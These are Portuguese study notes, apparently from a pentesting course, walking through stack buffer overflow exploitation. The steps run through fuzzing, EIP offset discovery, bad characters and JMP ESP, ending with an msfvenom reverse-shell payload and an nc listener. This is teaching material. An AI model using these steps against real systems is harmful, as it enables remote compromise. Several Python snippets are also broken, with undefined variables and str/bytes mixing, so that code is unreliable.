

# Introdução

Nesse módulo entenderemos com explorar vulnerabilidades do tipo Buffer Overflow que estão presentes em diversas aplicações tornando-se indispensável ao Pentester.

### Conceitos básicos:

- Buffer: Espaço de dados reservado para variáveis passadas ao programa pelo usuário ou outro objeto
    
- Buffer Overflow:
    
    ```bash
    Buffler Overflow ocorre quando a aplicação permite receber um número maior de 
    dados pelo usuário. Com isso o usuário pode passar dados demais de forma 
    maliciosa e acabar sobre-escrevendo o espaço de registradores da aplicação.
    
    Com isso fica possível controlar o conteúdo de registradores e muitas vezes até 
    controlar o funcionamento da aplicação a partir de registradores....
    ```
    
    Em um cenário onde os bytes de **`EIP`**por exemplo são sobre escritos é possível controlar a próxima chamada do programa enviando a sequência correta.
    
    Nesse módulo revisaremos diversos cenários para entender isso mais a fundo.
    
    ### Passos para Buffer Overflow:
    
    - *Saber quantos bytes para atingir EIP*
    - *Verificar o controle do EIP*
    - *Verificar BadCharacters para a aplicação*
    - *Encontrar um bom endereço de retorno*
    - *Aplicar Shell Code e ganhar controle*



----




# Analisando Buffer Overflow

Nesse módulo exploraremos um exemplo para entender como funciona o Buffer e seu comportamento via Debbuger

1. Iniciaremos criando um código em C com o buffer sendo passado como argumento
    
    ```bash
    #include <stdio.h>
    #include <>string.h>
    
    int main(int argc, char *argv[]){
    	char nome[16]; --> Perceba que é aqui que definimos o tamanho do Buffer
    	
    	strcpy(nome,argv[1]);
    	
    	return 0;
    }
    ```
    
2. A seguir iremos testar a execução desse código passando mais argumentos que o idealizado e observando no Debugger. Para passar um argumento via Debugger clique em **Debug > Arguments e reinicie o programa.**
    
    Nesse caso faremos duas observações:
    
    Observação 1: Argumento passado Mateus
    
    Perceba que se definirmos que o argumento passado for Mateus, reiniciarmos o programa e depois clicarmos em play com breakpoint na função,teremos um conteúdo no buffer:
    
    ![[Pasted image 20251119223757.png]]
    
    *Perceba que o endereço passado também é referente a `ESP` que recebe a variável*
    
    *Depois de mais alguns FN + F7 ele preenche o buffer com Mateus*
    
    ![[Pasted image 20251119223804.png]]
    
    Observação 2: Argumento passado ==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
    
    Perceba que se definirmos que o argumento passado for vários A teremos dessa vez um comportamento diferente observado no buffer a direita e o programa quebra, observe:
    
    ![[Pasted image 20251119223825.png]]
    
    **`Perceba que dessa vez o argumento passado extrapolou o buffer e chegou até a preencher o endereço referente a EIP, causando com o que o próximo endereço de memória a ser chamado fosse AAAAAAAA ou 41414141 que não existe…..`**
    
    Isso ocorre pois a estrutura do buffer é:
    
    ```bash
    [ESP]
    [Buffer]
    [Buffer]
    [EIP]
    ```
    




----





# Overview sobre Code Review

Agora que entendemos como funciona o Buffer Overflow vale a pena também reservar uma sessão para entendermos como evitar a criação de códigos vulneráveis.

Com isso, é importante que quando colocarmos uma função como:

- `scanf`
- `strcpy`
- `gets`

Sejam feitos tratamentos no código para limitar o usuário a repassar apenas uma quantidade = ou menor ao reservado ao Buffer.

Exemplos práticos pra isso:

Utilizar funções que realizem a limitação por padrão

- `fgets`
- `strncpy`

Em resumo sempre verifique que variáveis que receberão itens do usuário tenham seus buffers limitados ou por **funções seguras**, ou por **Ifs** e **Exceptions** no próprio código.

OBS: `CTRL+F9` : Mostra sessão de código no debugger

# Verificando alvos para Buffer Overflow

Nesse módulo entendermos melhor quais são os passos para identificar alvos para exploração via Buffer Overflow e como explorá-los.

Nos módulos seguintes conseguiremos aprofundar com mais detalhes cada um dos itens, mas para esse fiquei com o passo a passo resumido:

1. Coleta de informações do software, capturar os itens:
    1. Nome
    2. Versão
    3. Banner Grabbing
    4. Teste de comandos
    5. Entender funcionamento afundo
2. Montar ambiente simulado com as informações coletadas, o mais real possível
3. `Fuzzing` : Identificação do máximo de bytes que a aplicação recebe antes de quebrar
4. Identificar Bytes do EIP
5. Confirmar controle do EIP
6. Identificação de Bad Chars
7. Identificar endereços de retorno
8. Testar, geral shell code e executar shell code remotamente

*Os testes feitos pelo Longatto foram no Win10 e com a aplicação NetServer

# Fuzzing com Python

O segundo passo para exploração de Buffer Overflow é o **Fuzzing** que em resumo tem uma função muito simples: **Descobrir com quantos bytes enviados a aplicação quebra.**

Para isso criaremos um código para envio de dados e retorno na tela…

```python
import socket

lista = ["a"]
contador = int(input("Passe o número a ser incrementado continuamente: ")) #Acrescenta de 100 em 100 bytes
ip = str(input("Passe o IP a ser alvo: "))
porta = int(input("Passe a porta do alvo: "))

while len(lista) < 51:
    lista.append("A"*contador)
    contador  = contador +contador

for dados in lista:
    print(f"Fuzzing enviando {len(dados)} bytes")
    MSBsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    MSBsocket.connect((ip,porta))
    MSBsocket.recv(1024)
    MSBsocket.send(b"SEND " + dados + b"\\r\\n")
```

### Passo a passo para construção do código:

1. Crie um novo socket de conexão com a aplicação
    
2. Envie o mesmo símbolo repetido diversas vezes até a aplicação quebrar
    
3. Retorne ao user do código o último número enviado antes da quebra
    
    *Pode ser feito também com prints recorrentes da tela
    
    *Faz sentido fazer código que recebe do user qual o máximo de bytes a ser enviado e de quanto em quanto ele faz os pulos para o próximo envio
    

### Identificando Vulnerabilidades

Feito o Fuzzler e confirmado quantos bytes a aplicação recebe até quebrar agora validaremos essa descoberta no Debugger.

Para isso alteraremos o código para que ele envie o mesmo símbolo até o fim do buffer encontrado.

Para validar essa descoberta devemos observar no Debugger uma nova quebra do código ou o `EIP` sobre sobrescrito (melhor cenário)





------





# Encontrando Offset Manualmente

Nesse módulo temos como foco utilizar os conhecimentos repassados até agora + Debugger para encontrar quais Bytes do payload de envio serão referentes a posição do EIP para a aplicação.

*Para isso precisa ter encontrado número máximo de bytes enviados antes da quebra

Para isso entenda o passo a passo listado abaixo:

1. Crie um novo socket de conexão no Python e no payload coloque metade um símbolo e metade outro
    
    ```bash
    import socket
    
    ip = str(input("Passe o IP a ser alvo: "))
    porta = int(input("Passe a porta do alvo: "))
    
    bytes = "AAAAAAAAAAAAAA" + "BBBBBBBBBBBBBB"
    
    #Soma de A+B é o máximo de bytes enviados antes de quebrar
    
    for dados in lista:
        print(f"Fuzzing enviando {len(dados)} bytes")
        MSBsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        MSBsocket.connect((ip,porta))
        MSBsocket.recv(1024)
        MSBsocket.send(b"SEND " + dados + b"\\r\\n")
    ```
    
2. Feito isso identifique qual símbolo o `EIP` recebeu no Debugger e logo após divida novamente o buffer em 1/4 símbolo que `EIP` recebeu, 1/4 novo símbolo e o 1/2 que não era o símbolo de `EIP` mantenha igual.
    
    ```bash
    import socket
    
    ip = str(input("Passe o IP a ser alvo: "))
    porta = int(input("Passe a porta do alvo: "))
    
    bytes = "AAAAAAAAAAAAAA" + "BBBBBB" +"CCCCCC"
    
    #Se tinha B no buffer do EIP
    
    for dados in lista:
        print(f"Fuzzing enviando {len(dados)} bytes")
        MSBsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        MSBsocket.connect((ip,porta))
        MSBsocket.recv(1024)
        MSBsocket.send(b"SEND " + dados + b"\\r\\n")
    ```
    
3. Repita esse processo até chegar a menor parcela possível do EIP fazendo tudo de forma manual
    
    ```bash
    import socket
    
    ip = str(input("Passe o IP a ser alvo: "))
    porta = int(input("Passe a porta do alvo: "))
    
    bytes = "AAAAAAAAAAAAAA" + "BBB"+"DDD" +"CCCCCC"
    
    #Perceba que EIP continua no B então dividimos ele novamente, se só tiver D no buffer você sabe quais são os bytes de EIP
    
    for dados in lista:
        print(f"Fuzzing enviando {len(dados)} bytes")
        MSBsocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        MSBsocket.connect((ip,porta))
        MSBsocket.recv(1024)
        MSBsocket.send(b"SEND " + dados + b"\\r\\n")
    ```
    
    _Lembre que se deve manipular o envio de dados para ir garimpando na sequência de envio qual a posição dos bytes do payload entrarão no EIP_
    
    _Tudo analisado no Debugger_
    




------






# Encontrando Offset via padrões

Em certa medida é possível automatizar o processo para encontrar o Offset feito manualmente no módulo anterior.

Para isso utilizaremos dois comandos:

- `/usr/bin/msf-pattern_create` : Cria uma sequência de bytes que deve ser enviada em forma de payload para aplicação. Essa sequencia auxiliar a identificar padrões.
    - `-l` : Especifica o tamanho dos bytes
- `/usr/bin/msf-pattern_offset -l <bytes> -q <bytes do eip>` : Após rodar o comando acima substitua nesse comando após o -q os bytes observados no EIP para receber de retorno sua posição. Isso simplifica em muito o processo….

Testes realizados:

![[Pasted image 20251119223906.png]]

—> Primeira seta: Maior tamanho de bytes possíveis a serem enviados

—> Segunda seta: Valor presente no registrador EIP visto no Debugger



-----






# Encontrando espaço para ShellCode

Agora que encontramos quais bytes são referentes ao EIP faz bastante sentido entendermos qual o restante de espaço que podemos explorar para enviar um código malicioso.

Esse código ficará adormecido na memória até podermos chama-lo com EIP

### Passo a passo para verificação

1. Com o código utilizado para encontrar EIP realize o envio de bytes de outro caractere após o EIP
    
2. Siga o envio crescente até a quebra do programa.
    
3. No debugger realize a confirmação desse envio e do tamanho do buffer nos espaços de memória
    
    ![[Pasted image 20251119223918.png]]
    



-----





# BadChars

Antes de seguirmos para a exploração do BufferOverflow precisamos validar os caracteres possíveis a serem enviados para a aplicação…

Esse passo pode parecer não muito importante, mas caso exista algum caractere não entendido pela aplicação ele pode gerar `muita dor de cabeça` por isso sempre faça

### Criando lista de caracteres ASCII

Precisamos iniciar tendo uma lista de todos os caracteres em ASCII, para isso precisamos primeiro entender o formato da lista (hexadecimal) e quantos caracteres temos em ASCII (0-256).

*`print(\\x<id>)` : Printa valor ASCII

*`hex(100)` : Mostra 100 em hexadecimal

*`print(<valor>,)` : Printa itens em um loop um do lado do outro

1. Cria loop de 0 a 256 : `for i in range(0,256)`
2. Printa esses valores de forma hexadecimal um do lado do outro `print(<valor>,)`
3. Utilizando a função `.replace` substitui o 0x do hexadecimal por \x para enviar a aplicação
4. Gera lista de todos esses caracteres sem espaço entre eles

### Gerando Verificação ASCII

1. Faço o envio da lista criada via script socket em Python
    
2. Confirme o envio e abra o Debugger
    
3. Observe o **Follow in Dump** do Debugger, bytes que forem enviados e não constarem ali quer dizer que a aplicação não soube trata-los
    
    *Ponto de atenção —> Se aplicação não souber lidar com o primeiro Byte enviado ela não mostrará nenhum outro no buffer
    

```python
a = "" for i in range(0,265):    a = a + hex(i).replace("0x", "\\\\x")print(a)
```



-----






# Identificando endereço de retorno

Considerado o passo mais importante do processo de exploração de BufferOverflow antes de iniciar a identificação de um endereço de retorno primeiros recapitulamos que temos todo o necessário:

- Quais são os badchars?
- Quais são os bytes do EIP?
- Qual o tamanho de ESP? (Buffer liberado para shellcode)

Feita essa breve review entenda o conceito abaixo:

—> Se ESP for sobreposto com o ShellCode de exploração e eu conseguir fazer EIP apontar para ESP então é possível explorar o BufferOverflow < —

|

—> O problema é que o endereço de ESP muda a cada execução

`Solução:` Encontraremos um endereço fixo que tenha como função associada `JMP ESP`

Para encontrar essas funções precisaremos abrir o Debugger e selecionar a aba `e` , clicar em `view code in CPU`nas DLLs (caso necessário) em seguida clique com o botão direito e `search for command` colocando o JMP ESP como comando —> O endereço dessa função que usaremos.

Feito esse processo teremos o endereço de retorno desejado… Sendo assim esse será o endereço que enviaremos para `EIP`

_Muito Importante_: Para evitar firewall sempre tente achar DLLs do próprio programa

Comando auxiliador do debugger:

`!mona modules`

`!mona find -s “xff\\xe4” -m <DLL>`

### Testando fluxos de conexão

Para validar todo o citado acima devemos validar o fluxo de conexão criado.

Para isso temos o seguinte passo a passo:

1. Coloque um breakpoint no endereço de retorno passado a EIP via debugger (endereço que aponta para JMP ESP)
    
    _Lembre-se que comandos e o endereço devem ser passados ao contrário_
    
2. Valide com FN+F7 que o fluxo segue normalmente e ativa ESP consequentemente ativando o código ShellCode passado
    




-----






# Gerando e inserindo ShellCode

Para finalizar o processo necessário precisamos apenas gerar o Shellcode a ser passado para ESP logo após dos bytes de EIP.

Para fazer isso usaremos o metasploit e sua construção de payloads, repare abaixo o comando:

`msfvenom -p <payload> lhost=<ip> lport=<porta> exitfunc=thread -b “<badchars achados>” -f c` : Gera payload em bytes

—> `-f` mostra o tipo de código a ser criado

—> Não se esqueça de abrir a porta no seu pc `nc -vlnp <porta>`

### Criando Exploit

Para fazer uma validação final teste o envio dos bytes no Debugger observando o shellcode enviado e sua ordem, perceba que a tradução de ASCII pode ajudar…

Sempre revise bem todos os passos acima ←